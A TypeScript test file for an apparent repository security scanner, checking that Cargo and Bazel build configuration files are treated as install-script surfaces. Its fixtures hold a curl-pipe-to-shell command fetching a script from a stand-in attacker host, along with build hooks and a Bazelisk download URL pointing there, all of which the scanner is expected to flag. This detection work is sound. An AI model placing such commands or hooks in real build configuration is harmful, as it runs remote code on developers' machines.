import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

/**
 * Cargo and Bazel read these files on every build, and each can name a
 * program for the build to run: `build.rustc-wrapper`, `target.*.runner`
 * and `target.*.linker` in Cargo configuration, `--workspace_status_command`
 * and `--run_under` in a bazelrc, and `BAZELISK_BASE_URL` in `.bazeliskrc`,
 * which chooses where Bazelisk downloads the Bazel binary it runs.
 */
const CONFIGS: [string, string][] = [
  [".cargo/config.toml", `[build]\nrustc-wrapper = "./w.sh"\n# ${PAYLOAD}\n`],
  [".cargo/config", `[build]\nrustc-wrapper = "./w.sh"\n# ${PAYLOAD}\n`],
  [".bazelrc", `build --workspace_status_command=./s.sh\n# ${PAYLOAD}\n`],
  ["tools/ci.bazelrc", `test --run_under=./r.sh\n# ${PAYLOAD}\n`],
  [".bazeliskrc", `BAZELISK_BASE_URL=https://evil.example\n# ${PAYLOAD}\n`],
];

test("Cargo and Bazel configuration is scanned as an install script", () => {
  for (const [file, text] of CONFIGS)
    for (const path of [file, `crates/core/${file}`, file.toUpperCase()]) {
      expect({ path, surfaces: surfacesOf(path) }).toEqual({
        path,
        surfaces: ["installScripts", "source"],
      });
      const inspection = inspected(path, text);
      expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
        path,
        coverage: { state: "complete", items: 1 },
      });
      expect({
        path,
        findings: inspection.findings.map(
          (finding) =>
            `${finding.path}:${finding.category}:${finding.severity}`,
        ),
      }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
    }
});

test("Cargo configuration names outside a .cargo directory keep their surfaces", () => {
  // Cargo reads `config` and `config.toml` only from a `.cargo` directory.
  expect(surfacesOf("config")).toEqual([]);
  expect(surfacesOf("app/config.toml")).toEqual(["source"]);
  expect(surfacesOf("docs/bazelrc.md")).toEqual([]);
});
